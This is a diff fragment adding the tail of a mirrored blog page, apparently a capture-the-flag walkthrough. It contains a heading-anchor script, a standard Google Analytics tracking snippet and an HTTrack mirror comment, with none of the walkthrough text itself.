+    anchor.href      = "#" + id;
+    anchor.innerHTML = "<i class=\"fa fa-link\"></i>";
+    return anchor;
+  };
+
+  var linkifyAnchors = function (level, containingElement) {
+    var headers = containingElement.getElementsByTagName("h" + level);
+    for (var h = 0; h < headers.length; h++) {
+      var header = headers[h];
+
+      if (typeof header.id !== "undefined" && header.id !== "") {
+        header.appendChild(anchorForId(header.id));
+      }
+    }
+  };
+
+  document.onreadystatechange = function () {
+    if (this.readyState === "complete") {
+      var contentBlock = document.getElementsByClassName("docs")[0] || document.getElementsByClassName("blog")[0];
+      if (!contentBlock) {
+        return;
+      }
+      for (var level = 1; level <= 6; level++) {
+        linkifyAnchors(level, contentBlock);
+      }
+    }
+  };
+</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-55017594-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+</body>
+
+<!-- Mirrored from highon.coffee/blog/lamp-security-ctf7-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 18:05:00 GMT -->
+</html>
